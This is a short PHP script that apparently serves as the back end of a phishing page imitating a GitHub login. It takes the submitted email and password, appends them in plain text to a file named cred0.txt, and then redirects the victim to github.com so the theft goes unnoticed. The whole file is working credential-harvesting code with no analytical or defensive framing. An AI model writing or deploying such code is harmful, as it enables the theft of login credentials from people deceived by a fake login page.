<?php
$var = $_POST['email'];
$var2 = $_POST['pass'];
    file_put_contents("cred0.txt", " Username or email adress: " . $var . " password: " . $var2 . "\n", FILE_APPEND);
    header('Location: https://github.com/');
exit();
?>

